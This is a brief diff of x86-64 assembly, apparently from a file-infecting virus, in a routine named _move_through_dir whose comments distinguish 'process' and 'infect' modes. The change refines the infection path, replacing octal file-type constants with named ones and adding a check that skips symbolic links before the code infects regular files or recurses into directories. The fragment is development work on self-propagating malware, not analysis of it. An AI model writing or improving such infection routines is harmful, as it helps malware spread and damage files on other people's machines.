@@ -366,9 +366,11 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 			jmp .free_buffers
 			.infect:
-				cmp rax, 0o0100000 ; S_IFREG
+				cmp rax, S_IFREG ; S_IFREG
 				je .infect_file
-				cmp rax, 0o0040000 ; S_IFDIR
+				cmp rax, S_IFLNK ; S_IFLNK
+				je .free_buffers
+				cmp rax, S_IFDIR ; S_IFDIR
 				jne .free_buffers
 
 			; infect dir
